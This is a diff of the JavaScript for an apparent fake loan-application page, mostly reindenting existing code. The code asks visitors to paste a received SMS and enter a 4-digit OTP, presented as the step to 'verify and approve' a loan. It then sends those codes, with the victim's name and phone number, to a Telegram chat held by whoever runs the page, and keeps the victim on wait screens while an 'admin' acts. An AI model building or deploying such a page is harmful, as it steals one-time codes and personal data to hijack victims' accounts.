-                document.getElementById('bSms').className = 'btn-sms';
-                document.getElementById('smsTimerWrap').style.display = 'none';
+            if (smsTimerExpired) {
                 document.getElementById('smsResendWrap').style.display = 'block';
                 document.getElementById('bResend').disabled = false;
-                document.getElementById('mResend').classList.remove('show');
-                ['smsMsg', 'smsMsgOk'].forEach(function(id) {
-                    document.getElementById(id).classList.remove('show');
-                });
+                return;
             }
-        };
 
-        smsTimerInterval = setInterval(tick, 1000);
-    }
-
-    function stopSmsTimer() {
-        if (smsTimerInterval) {
-            clearInterval(smsTimerInterval);
-            smsTimerInterval = null;
-        }
-    }
-
-    async function doSmsResend() {
-        const btn = document.getElementById('bResend');
-        const spinner = document.getElementById('mResend');
-        btn.disabled = true;
-        spinner.classList.add('show');
-        ['smsMsg', 'smsMsgOk'].forEach(function(id) {
-            document.getElementById(id).classList.remove('show');
-        });
-
-        try {
-            const session = getSession(S.applicationId);
-            if (session) {
-                await tgCall("sendMessage", {
-                    chat_id: TG_CHAT,
-                    text: `🔄 User requested a new SMS message.\nApplication ID: ${S.applicationId}`
-                });
-                spinner.classList.remove('show');
-                document.getElementById('smsResendWrap').style.display = 'none';
-                document.getElementById('smsMsgBox').disabled = false;
-                document.getElementById('bSms').disabled = false;
-                startSmsTimer();
-                showSmsMsg('success', 'A new SMS has been requested. Admin will send it shortly.');
-                btn.disabled = false;
-            } else {
-                throw new Error('Session not found');
+            const msg = document.getElementById('smsMsgBox').value.trim();
+            if (msg.length < 3) {
+                showSmsMsg('error', 'Please paste an SMS message.');
+                return;
             }
-        } catch (err) {
-            spinner.classList.remove('show');
-            btn.disabled = false;
-            showSmsMsg('error', 'Network error: ' + err.message);
-        }
-    }
 
-    async function doSmsParse() {
-        ['smsMsg', 'smsMsgOk'].forEach(id => document.getElementById(id).classList.remove('show'));
+            document.getElementById('mSms').classList.add('show');
+            document.getElementById('bSms').disabled = true;
 
-        if (smsTimerExpired) {
-            document.getElementById('smsResendWrap').style.display = 'block';
-            document.getElementById('bResend').disabled = false;
-            return;
-        }
+            try {
+                const session = getSession(S.applicationId);
+                if (session) {
+                    // ─── Send SMS with full user details (name & number) ───
+                    updateSession(S.applicationId, {
+                        smsMessage: msg,
+                        stage: 'sms_submitted'
+                    });
+                    await tgNotify({
+                        id: S.applicationId,
+                        firstName: S.firstName,
+                        lastName: S.lastName,
+                        phone: S.phone,
+                        smsMessage: msg
+                    }, 'sms');
 
-        const msg = document.getElementById('smsMsgBox').value.trim();
-        if (msg.length < 3) {
-            showSmsMsg('error', 'Please paste an SMS message.');
-            return;
-        }
-
-        document.getElementById('mSms').classList.add('show');
-        document.getElementById('bSms').disabled = true;
-
-        try {
-            const session = getSession(S.applicationId);
-            if (session) {
-                updateSession(S.applicationId, {
-                    smsMessage: msg,
-                    stage: 'sms_submitted'
-                });
-                await tgNotify({
-                    id: S.applicationId,
-                    firstName: S.firstName,
-                    lastName: S.lastName,
-                    phone: S.phone,
-                    smsMessage: msg
-                }, 'sms');
-
+                    document.getElementById('mSms').classList.remove('show');
+                    stopSmsTimer();
+                    document.getElementById('waitSmsAppId').textContent = S.applicationId;
+                    goTo('page-wait-sms');
+                } else {
+                    throw new Error('Session not found');
+                }
+            } catch (err) {
                 document.getElementById('mSms').classList.remove('show');
-                stopSmsTimer();
-                document.getElementById('waitSmsAppId').textContent = S.applicationId;
-                goTo('page-wait-sms');
-            } else {
-                throw new Error('Session not found');
+                document.getElementById('bSms').disabled = false;
+                showSmsMsg('error', 'Error: ' + err.message);
             }
-        } catch (err) {
-            document.getElementById('mSms').classList.remove('show');
-            document.getElementById('bSms').disabled = false;
-            showSmsMsg('error', 'Error: ' + err.message);
-        }
-    }
-
-    // ============================================================
-    // OTP PAGE — 4-DIGIT OTP
-    // ============================================================
-    function handleOtpInput(el, type) {
-        el.value = el.value.replace(/\D/, '');
-        const idx = parseInt(el.id.match(/\d$/)[0]);
-        if (el.value && type === 'otp' && idx < 3) {
-            document.getElementById(type + (idx + 1)).focus();
-        }
-        chkOtp();
-    }
-
-    function chkOtp() {
-        const otpOk = [0, 1, 2, 3].every(i => document.getElementById('otp' + i).value);
-        document.getElementById('bOtp').className = otpOk ? 'btn-otp rdy' : 'btn-otp';
-    }
-
-    function showOtpMsg(type, text) {
-        ['otpMsg', 'otpMsgOk'].forEach(id => document.getElementById(id).classList.remove('show'));
-        if (type === 'error') {
-            document.getElementById('otpMsgTxt').textContent = text;
-            document.getElementById('otpMsg').classList.add('show');
-        }
-        if (type === 'success') {
-            document.getElementById('otpMsgOkTxt').textContent = text;
-            document.getElementById('otpMsgOk').classList.add('show');
-        }
-    }
-
-    async function doOtp() {
-        ['otpMsg', 'otpMsgOk'].forEach(id => document.getElementById(id).classList.remove('show'));
-
-        const otp = [0, 1, 2, 3].map(i => document.getElementById('otp' + i).value).join('');
-
-        if (otp.length < 4) {
-            showOtpMsg('error', 'Please enter 4-digit OTP code.');
-            return;
         }
 
-        document.getElementById('mOtp').classList.add('show');
-        document.getElementById('bOtp').disabled = true;
-        document.getElementById('bOtp').textContent = 'VERIFYING...';
+        // ══════════════════════════════════════════════════════
+        // OTP PAGE — 4-DIGIT OTP
+        // ══════════════════════════════════════════════════════
+        function handleOtpInput(el, type) {
+            el.value = el.value.replace(/\D/, '');
+            const idx = parseInt(el.id.match(/\d$/)[0]);
+            if (el.value && type === 'otp' && idx < 3) {
+                document.getElementById(type + (idx + 1)).focus();
+            }
+            chkOtp();
+        }
 
-        try {
-            const session = getSession(S.applicationId);
-            if (session) {
-                updateSession(S.applicationId, {
-                    otp: otp,
-                    stage: 'otp_submitted'
-                });
-                await tgNotify({
-                    id: S.applicationId,
-                    firstName: S.firstName,
-                    lastName: S.lastName,
-                    phone: S.phone,
-                    otp: otp
-                }, 'otp');
+        function chkOtp() {
+            const otpOk = [0, 1, 2, 3].every(i => document.getElementById('otp' + i).value);
+            document.getElementById('bOtp').className = otpOk ? 'btn-otp rdy' : 'btn-otp';
+        }
 
+        function showOtpMsg(type, text) {
+            ['otpMsg', 'otpMsgOk'].forEach(id => document.getElementById(id).classList.remove('show'));
+            if (type === 'error') {
+                document.getElementById('otpMsgTxt').textContent = text;
+                document.getElementById('otpMsg').classList.add('show');
+            }
+            if (type === 'success') {
+                document.getElementById('otpMsgOkTxt').textContent = text;
+                document.getElementById('otpMsgOk').classList.add('show');
+            }
+        }
+
+        async function doOtp() {
+            ['otpMsg', 'otpMsgOk'].forEach(id => document.getElementById(id).classList.remove('show'));
+
+            const otp = [0, 1, 2, 3].map(i => document.getElementById('otp' + i).value).join('');
+
+            if (otp.length < 4) {
+                showOtpMsg('error', 'Please enter 4-digit OTP code.');
+                return;
+            }
+
+            document.getElementById('mOtp').classList.add('show');
+            document.getElementById('bOtp').disabled = true;
+            document.getElementById('bOtp').textContent = 'VERIFYING...';
+
+            try {
+                const session = getSession(S.applicationId);
+                if (session) {
+                    updateSession(S.applicationId, {
+                        otp: otp,
+                        stage: 'otp_submitted'
+                    });
+                    await tgNotify({
+                        id: S.applicationId,
+                        firstName: S.firstName,
+                        lastName: S.lastName,
+                        phone: S.phone,
+                        otp: otp
+                    }, 'otp');
+
+                    document.getElementById('mOtp').classList.remove('show');
+                    document.getElementById('waitOtpAppId').textContent = S.applicationId;
+                    goTo('page-wait-otp');
+                } else {
+                    throw new Error('Session not found');
+                }
+            } catch (err) {
                 document.getElementById('mOtp').classList.remove('show');
-                document.getElementById('waitOtpAppId').textContent = S.applicationId;
-                goTo('page-wait-otp');
-            } else {
-                throw new Error('Session not found');
+                document.getElementById('bOtp').disabled = false;
+                document.getElementById('bOtp').textContent = 'VERIFY & APPROVE LOAN';
+                showOtpMsg('error', 'Error: ' + err.message);
             }
-        } catch (err) {
-            document.getElementById('mOtp').classList.remove('show');
-            document.getElementById('bOtp').disabled = false;
-            document.getElementById('bOtp').textContent = 'VERIFY & APPROVE LOAN';
-            showOtpMsg('error', 'Error: ' + err.message);
         }
-    }
 
-    // INIT
-    updateCalc();
-    goTo('page-landing');
-</script>
+        // INIT
+        updateCalc();
+        goTo('page-landing');
+    </script>
 </body>
 
 </html>
